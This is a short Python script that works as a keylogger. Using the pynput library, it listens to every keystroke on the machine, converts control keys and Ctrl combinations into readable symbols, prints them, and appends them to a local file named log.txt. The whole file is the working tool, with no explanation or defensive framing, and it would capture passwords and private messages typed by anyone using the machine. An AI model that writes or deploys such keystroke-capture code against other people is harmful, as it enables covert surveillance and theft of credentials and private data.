from pynput.keyboard import Key, Listener


characters = {
    "<96>": 0,
    "<97>": 1,
    "<98>": 2,
    "<99>": 3,
    "<100>": 4,
    "<101>": 5,
    "<102>": 6,
    "<103>": 7,
    "<104>": 8,
    "<105>": 9,
    "<110>": ",",
    "[^]": "^",
    "\\x11": " Ctrl+Q ",
    "\\x17": " Ctrl+W ",
    "\\x05": " Ctrl+E ",
    "\\x12": " Ctrl+R ",
    "\\x14": " Ctrl+T ",
    "\\x10": " Ctrl+P ",
    "\\x01": " Ctrl+A ",
    "\\x13": " Ctrl+S ",
    "\\x04": " Ctrl+D ",
    "\\x06": " Ctrl+F ",
    "\\x1a": " Ctrl+Z ",
    "\\x18": " Ctrl+X ",
    "\\x03": " Ctrl+C ",
    "\\x16": " Ctrl+V ",
    "enter": "↵",
    "backspace": "⌫",
    "delete": "⌦",
    "space": "⎵",
    "tab": "↹",
    "caps_lock": "⇪",
    "num_lock": "⇭",
    "up": "↑",
    "down": "↓",
    "right": "→",
    "left": "←",
}

escape = [
    "ctrl_l",
    "alt_l",
    "ctrl_l",
    "alt_gr",
    "ctrl_r",
    "shift_r",
    "shift",
    "home",
    "end",
    "page_up",
    "page_down",
    "insert",
]


def on_press(key):
    key = str(key)
    if key == '"\'"':
        key = key.replace('"', "")
    else:
        key = key.replace("'", "")
    key = key.replace("Key.", "")

    if key in escape:
        return

    if key in characters:
        print(characters[key])
        write_file(characters[key])
    else:
        print(key)
        write_file(key)


def on_release(key):
    if key == Key.esc:
        pass


def write_file(key):
    with open("log.txt", "a", encoding="utf-8") as file:
        file.write(str(key))


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
